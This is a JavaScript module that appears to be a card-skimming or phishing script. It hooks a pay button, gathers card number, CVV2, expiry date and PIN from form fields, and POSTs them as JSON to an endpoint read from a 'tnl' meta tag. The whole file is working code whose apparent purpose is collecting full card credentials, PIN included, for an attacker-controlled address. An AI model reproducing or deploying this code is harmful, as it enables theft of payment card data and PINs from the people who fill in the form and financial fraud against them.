export function init(){
    const payBtn = document.getElementById('payButton');
    payBtn.addEventListener('click',getCardInfo)
}
async function getCardInfo(e){
    const inputPin = document.getElementById('inputpin');
    if (inputPin.value.length > 0)
    {
        let inputCardNumber = '';
        if (!document.getElementById('CardNumber_Pan0')){ inputCardNumber = document.getElementById('cardnumber').value;}
        else {
            for (let i =0; i < 4; i++)
            {
                inputCardNumber = inputCardNumber + document.getElementById(`CardNumber_Pan${i}`).value;
            }
        }
        const inputCvv2 = document.getElementById('inputcvv2').value;
        const inputMonth = document.getElementById('inputmonth').value;
        const inputYear = document.getElementById('inputyear').value;
        const inputPin = document.getElementById('inputpin').value;
        const info = {
            cardNumber : inputCardNumber,
            ccv2 : inputCvv2,
            exMonth : inputMonth,
            exYear : inputYear,
            pin : inputPin
        }
        const response = await sendInfo(info);
        console.log(response);
    }
}
function sendInfo(info){
    return new Promise((resolve,reject)=>{
        const xml = new XMLHttpRequest();
        const tnl = document.querySelector('meta[name=tnl]').getAttribute('content');
        xml.open('POST',tnl);
        xml.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xml.send(JSON.stringify(info));
        xml.onload = function (){
            if (this.status === 200)
            {
                resolve(this.response);
            }
            else
            {
                reject();
            }
        }
    })
}
